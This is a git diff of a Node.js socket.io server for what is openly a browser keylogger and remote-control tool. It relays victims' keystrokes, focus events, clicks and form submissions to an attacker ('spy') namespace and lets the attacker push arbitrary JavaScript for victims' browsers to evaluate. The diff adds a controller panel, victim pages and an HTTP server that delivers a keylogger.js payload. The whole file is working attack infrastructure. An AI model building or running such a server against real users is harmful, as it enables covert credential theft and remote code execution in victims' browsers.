@@ -4,59 +4,78 @@ import https from 'https';
 import fs from 'fs';
 import path from 'path';
 import { Server } from 'socket.io';
+import chalk from 'chalk';
+import * as logger from './middlewares/logger.js'
 
 const __dirname = path.resolve()
 
 const app = express();
+
+const config = {
+    HTTPS_PORT: 8443,
+    HTTP_PORT: 8080,
+    WEB_SOCKET_PORT: 3000
+}
+
+
+app.use(logger.request)
+app.use("/", express.static(path.join(__dirname, 'public')));
+app.use("/victim", (req, res) => {
+    res.sendFile(__dirname + "/app/pages/victim.html")
+});
+app.use("/controller", (req, res) => {
+    res.sendFile(__dirname + "/app/pages/controller.html")
+});
+
+
 const socketServer = http.createServer(app);
 const io = new Server(socketServer);
 
 const spy = io
     .of('/spy')
     .on('connection', (socket) => {
-        console.log('Attacker connected.');
+        logger.socketSpy(socket, 'connected');
+        
         socket.on('eval', function (js) {
-            console.log('Remote JS:', js);
+            logger.socketSpy(socket, 'eval', js);
             victim.emit('eval', js);
         });
 
         socket.on('disconnect', () => {
-            console.log('Attacker disconnected.');
+            logger.socketSpy(socket, 'disconnected');
         });
     });
 
 const victim = io
     .of('/victim')
     .on('connection', (socket) => {
-        console.log('Victim connected');
+        logger.socketVictim(socket, 'connected');
 
         socket.on('type', function (key) {
-            console.log('victim/type:', key);
+            logger.socketVictim(socket, 'type', key);
             spy.emit('type', key);
         });
 
         socket.on('focus', function (focus) {
-            console.log('victim/focus:', focus);
+            logger.socketVictim(socket, 'focus', focus);
             spy.emit('focus', focus);
         });
 
         socket.on('click', function (click) {
-            console.log('victim/click:', click);
+            logger.socketVictim(socket, 'click', click);
             spy.emit('submit', click);
         });
 
         socket.on('submit', function (submit) {
-            console.log('victim/submit:', submit);
+            logger.socketVictim(socket, 'submit', submit);
             spy.emit('submit', submit);
         });
 
 
         socket.on('disconnect', function () {
-            console.log('Victim disconnected');
+            logger.socketVictim(socket, 'disconnected');
         });
     });
-
-app.use("/", express.static(path.join(__dirname, 'public')));
 
 var privateKey = fs.readFileSync(__dirname + '/certs/server.key', 'utf8');
 var certificate = fs.readFileSync(__dirname + '/certs/server.crt', 'utf8');
@@ -76,10 +95,27 @@ https.createServer(encryption, (req, res) => {
         res.writeHead(200);
         res.end(data);
     });
-}).listen(8443, () => {
-    console.log('Delivery server: https://0.0.0.0:8443');
+}).listen(config.HTTPS_PORT, () => {
+    console.log(chalk.green(`HTTPS delivery server: https://0.0.0.0:${config.HTTPS_PORT}`));
 });
 
-socketServer.listen(3000, () => {
-    console.log('WebSocket server listen on ws://0.0.0.0:3000');
+http.createServer((req, res) => {
+    fs.readFile(__dirname + '/app/utils/keylogger.js', function (err, data) {
+        if (err) {
+            res.writeHead(404);
+            res.end(JSON.stringify(err));
+            return;
+        }
+        res.writeHead(200);
+        res.end(data);
+    });
+}).listen(config.HTTP_PORT, () => {
+    console.log(chalk.green(`HTTP delivery server: http://0.0.0.0:${config.HTTP_PORT}`));
+});
+
+
+
+socketServer.listen(config.WEB_SOCKET_PORT, () => {
+    console.log(chalk.blue(`WebSocket server listen on ws://0.0.0.0:${config.WEB_SOCKET_PORT}`));
+    console.log(chalk.blue(`Painel admin at http://localhost:${config.WEB_SOCKET_PORT}/controller`));
 });
